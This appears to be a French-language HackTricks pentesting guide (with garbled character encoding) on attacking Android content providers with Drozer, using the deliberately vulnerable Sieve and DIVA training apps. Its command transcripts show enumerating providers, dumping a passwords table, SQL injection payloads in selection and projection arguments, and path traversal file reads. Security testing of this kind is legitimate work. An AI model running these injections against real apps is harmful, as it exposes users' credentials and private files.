## Exploitation des fournisseurs de contenu

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introduction

Un composant fournisseur de contenu **fournit des donnÃ©es d'une application Ã  d'autres** sur demande. Ces demandes sont traitÃ©es par les mÃ©thodes de la classe ContentResolver. Un fournisseur de contenu peut utiliser diffÃ©rentes faÃ§ons de stocker ses donnÃ©es et les donnÃ©es peuvent Ãªtre **stockÃ©es** dans une **base de donnÃ©es**, dans des **fichiers**, ou mÃªme sur un **rÃ©seau**.

Il doit Ãªtre dÃ©clarÃ© dans le fichier _Manifest.xml_. Exemple :
```markup
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
    <path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
Dans ce cas, il est nÃ©cessaire d'avoir la permission `READ_KEYS` pour accÃ©der Ã  `content://com.mwr.example.sieve.DBContentProvider/Keys`. (_Remarquez Ã©galement que dans la section suivante, nous allons accÃ©der Ã  `/Keys/` qui n'est pas protÃ©gÃ©, car le dÃ©veloppeur s'est trompÃ© et a protÃ©gÃ© `/Keys`, mais a dÃ©clarÃ© `/Keys/`_)

**Il est possible d'accÃ©der Ã  des donnÃ©es privÃ©es ou d'exploiter une vulnÃ©rabilitÃ© (Injection SQL ou Traversal de chemin).**

## Obtenir des informations Ã  partir des **fournisseurs de contenu exposÃ©s**
```
dz> run app.provider.info -a com.mwr.example.sieve 
  Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
  Path: /Keys
  Type: PATTERN_LITERAL
  Read Permission: com.mwr.example.sieve.READ_KEYS
  Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
```
Nous pouvons **reconstruire** une partie des **URI** de contenu pour accÃ©der au **DBContentProvider**, car nous savons qu'ils doivent commencer par "_content://_" et les informations obtenues par Drozer Ã  l'intÃ©rieur de Path: _/Keys_.

Drozer peut **deviner et essayer plusieurs URIs**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
... 
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys 
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
Vous devriez Ã©galement vÃ©rifier le **code du ContentProvider** pour rechercher des requÃªtes :

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

De plus, si vous ne trouvez pas de requÃªtes complÃ¨tes, vous pouvez **vÃ©rifier les noms dÃ©clarÃ©s par le ContentProvider** dans la mÃ©thode `onCreate` :

![](<../../../.gitbook/assets/image (186).png>)

La requÃªte sera comme suit : `content://nom.du.package.classe/nom_dÃ©clarÃ©`

## **Content Providers avec base de donnÃ©es**

Probablement la plupart des Content Providers sont utilisÃ©s comme **interface** pour une **base de donnÃ©es**. Par consÃ©quent, si vous y avez accÃ¨s, vous pourriez Ãªtre en mesure d'**extraire, de mettre Ã  jour, d'insÃ©rer et de supprimer** des informations.\
VÃ©rifiez si vous pouvez **accÃ©der Ã  des informations sensibles** ou essayez de les modifier pour **contourner les mÃ©canismes d'autorisation**.

Lorsque vous vÃ©rifiez le code du Content Provider, **recherchez** Ã©galement des **fonctions** nommÃ©es comme : _query, insert, update et delete_ :

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Car vous pourrez les appeler.

### Contenu de la requÃªte
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### InsÃ©rer du contenu

En interrogeant la base de donnÃ©es, vous apprendrez le **nom des colonnes**, puis vous pourrez insÃ©rer des donnÃ©es dans la base de donnÃ©es :

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Remarquez que dans l'insertion et la mise Ã  jour, vous pouvez utiliser --string pour indiquer une chaÃ®ne, --double pour indiquer un double, --float, --integer, --long, --short, --boolean_

### Mettre Ã  jour le contenu

En connaissant le nom des colonnes, vous pouvez Ã©galement **modifier les entrÃ©es** :

![](<../../../.gitbook/assets/image (190).png>)

### Supprimer le contenu

![](<../../../.gitbook/assets/image (191).png>)

### **Injection SQL**

Il est simple de tester l'injection SQL **(SQLite)** en manipulant les champs de **projection** et de **sÃ©lection** qui sont transmis au fournisseur de contenu.\
Lorsque vous interrogez le fournisseur de contenu, il y a 2 arguments intÃ©ressants pour rechercher des informations : _--selection_ et _--projection_ :

![](<../../../.gitbook/assets/image (192) (1).png>)

Vous pouvez essayer de **abuser** de ces **paramÃ¨tres** pour tester les **injections SQL** :
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" 
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* 
FROM SQLITE_MASTER WHERE type='table';--" 
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... | 
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**DÃ©couverte automatique de l'injection SQL par Drozer**

Drozer est un outil puissant pour l'analyse de sÃ©curitÃ© des applications Android. Il peut Ãªtre utilisÃ© pour dÃ©tecter automatiquement les vulnÃ©rabilitÃ©s d'injection SQL dans les applications Android. Pour ce faire, il utilise un module appelÃ© `scanner.provider.sqlinjection`.

Ce module analyse les fournisseurs de contenu de l'application Ã  la recherche de vulnÃ©rabilitÃ©s d'injection SQL. Il envoie des requÃªtes SQL malveillantes aux fournisseurs de contenu et analyse les rÃ©ponses pour dÃ©tecter les erreurs SQL. Si une erreur SQL est dÃ©tectÃ©e, cela signifie qu'il y a une vulnÃ©rabilitÃ© d'injection SQL dans l'application.

Pour utiliser ce module, vous devez d'abord vous connecter Ã  l'application cible Ã  l'aide de Drozer. Ensuite, vous pouvez exÃ©cuter la commande suivante pour lancer le module :

```
run scanner.provider.sqlinjection
```

Drozer enverra alors des requÃªtes SQL malveillantes aux fournisseurs de contenu de l'application et affichera les rÃ©sultats de l'analyse. Si une vulnÃ©rabilitÃ© d'injection SQL est dÃ©tectÃ©e, Drozer affichera les dÃ©tails de la vulnÃ©rabilitÃ©, y compris le nom du fournisseur de contenu vulnÃ©rable et la requÃªte SQL malveillante qui a Ã©tÃ© utilisÃ©e pour dÃ©tecter la vulnÃ©rabilitÃ©.

Il est important de noter que l'utilisation de ce module peut entraÃ®ner des faux positifs ou des faux nÃ©gatifs. Par consÃ©quent, il est recommandÃ© de vÃ©rifier manuellement toutes les vulnÃ©rabilitÃ©s dÃ©tectÃ©es par Drozer avant de les signaler comme des vulnÃ©rabilitÃ©s rÃ©elles.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
  
dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
  android_metadata
  notes
  sqlite_sequence
```
## **Fournisseurs de contenu basÃ©s sur le systÃ¨me de fichiers**

Les fournisseurs de contenu peuvent Ã©galement Ãªtre utilisÃ©s pour accÃ©der aux fichiers :

![](<../../../.gitbook/assets/image (193).png>)

### Lire un **fichier**

Vous pouvez lire des fichiers Ã  partir du fournisseur de contenu.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 
127.0.0.1            localhost
```
### **TraversÃ©e de chemin d'accÃ¨s**

Si vous pouvez accÃ©der aux fichiers, vous pouvez essayer d'exploiter une traversÃ©e de chemin d'accÃ¨s (dans ce cas, ce n'est pas nÃ©cessaire mais vous pouvez essayer d'utiliser "_../_" et des astuces similaires).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 
127.0.0.1            localhost
```
**DÃ©couverte automatique de la traversÃ©e de chemin par Drozer**

Drozer has a module that can automatically discover Path Traversal vulnerabilities in Content Providers. This module is called `scanner.provider.traversal`. 

Drozer dispose d'un module qui peut automatiquement dÃ©couvrir les vulnÃ©rabilitÃ©s de la traversÃ©e de chemin dans les fournisseurs de contenu. Ce module s'appelle `scanner.provider.traversal`.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
```
## RÃ©fÃ©rences

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
